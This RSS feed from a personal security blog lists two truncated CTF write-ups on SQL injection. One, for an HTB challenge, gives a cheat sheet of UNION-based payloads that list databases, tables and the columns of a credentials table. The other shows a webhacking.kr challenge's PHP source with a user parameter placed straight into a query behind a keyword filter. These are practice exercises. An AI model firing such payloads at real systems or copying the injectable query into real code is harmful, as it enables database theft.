<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Sql Injection on All Things Cyber – joonkim0625</title>
    <link>https://joonkim0625.github.io/tags/sql-injection/</link>
    <description>Recent content in Sql Injection on All Things Cyber – joonkim0625</description>
    <generator>Hugo -- 0.148.0</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 27 Oct 2024 00:14:09 +0000</lastBuildDate>
    <atom:link href="https://joonkim0625.github.io/tags/sql-injection/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Unholy Union</title>
      <link>https://joonkim0625.github.io/posts/2024-10-27-unholy-union/</link>
      <pubDate>Sun, 27 Oct 2024 00:14:09 +0000</pubDate>
      <guid>https://joonkim0625.github.io/posts/2024-10-27-unholy-union/</guid>
      <description>&lt;p&gt;A challenge about SLQi that uses Union injection technique.&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;unholy-main&#34; loading=&#34;lazy&#34; src=&#34;https://joonkim0625.github.io/images/Unholy.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;What is convenient about this challenge is it shows the query that is used to pull the data from the database. I used these SQL injection cheat sheet that is from the SQLi fundamental module from the HTB academy:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cn&amp;#39; UNION select 1,database(),2,3-- - 	Current database name
cn&amp;#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	List all databases
cn&amp;#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&amp;#39;dev&amp;#39;-- - 	List all tables in a specific database
cn&amp;#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&amp;#39;credentials&amp;#39;-- - 	List all columns in a specific table
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Steps I took based on the cheat sheet from the HTB Academy:&lt;/p&gt;</description>
    </item>
    <item>
      <title>webhackingkr-old-18</title>
      <link>https://joonkim0625.github.io/posts/2024-10-25-webhackingkr-old-18/</link>
      <pubDate>Fri, 25 Oct 2024 22:51:34 +0000</pubDate>
      <guid>https://joonkim0625.github.io/posts/2024-10-25-webhackingkr-old-18/</guid>
      <description>&lt;p&gt;This is a challenge from &lt;code&gt;webhacking.kr&lt;/code&gt;. As the name of the website suggests, it is about SQL injection. You can check the source code of the page:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no&amp;#39;&lt;/span&gt;]){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dbconnect&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/ |\/|\(|\)|\||&amp;amp;|select|from|0x/i&amp;#34;&lt;/span&gt;,$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no&amp;#39;&lt;/span&gt;])) &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no hack&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_fetch_array&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli_query&lt;/span&gt;($db,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select id from chall18 where id=&amp;#39;guest&amp;#39; and no=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$_GET[no]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)); &lt;span style=&#34;color:#75715e&#34;&gt;// admin&amp;#39;s no = 2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($result[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;guest&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hi guest&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($result[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;solve&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hi admin!&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our goal seems to be creating a payload that would make the &lt;code&gt;id&lt;/code&gt; value &lt;code&gt;admin&lt;/code&gt; and also make the &lt;code&gt;no&lt;/code&gt; value &lt;code&gt;2&lt;/code&gt;. So, let&amp;rsquo;s assume that there is no filter so we can enter anything as a payload. When we enter &lt;code&gt;2&lt;/code&gt; as our input, you will see something like this:&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
